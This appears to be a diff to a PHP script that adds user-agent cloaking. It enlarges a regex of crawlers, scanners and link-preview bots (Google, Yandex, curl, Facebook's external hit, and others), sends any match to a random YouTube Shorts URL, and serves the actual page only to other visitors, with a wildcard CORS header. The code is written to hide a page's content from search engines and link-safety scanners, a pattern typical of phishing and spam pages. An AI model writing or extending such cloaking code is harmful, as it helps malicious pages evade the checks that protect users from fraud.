@@ -1,10 +1,11 @@
 <?php
-if (preg_match("/facebook(external)?/i", $_SERVER['HTTP_USER_AGENT']))
-{
+if (preg_match('/bot|crawl|curl|dataprovider|search|get|spider|find|java|majesticsEO|google|yahoo|teoma|contaxe|yandex|libwww-perl|facebookexternalhit|facebook(external)/i', $_SERVER['HTTP_USER_AGENT'])) {
 $short_urlx2 = "https://www.youtube.com/shorts/".substr(md5(mt_rand()),0,20);
 header("location: $short_urlx2", true, 200);
 die();
 }
+
+
 
 header('Access-Control-Allow-Origin: *');
 header("Access-Control-Allow-Headers: X-API-KEY, Origin, X-Requested-With, Content-Type, Accept, Access-Control-Request-Method");
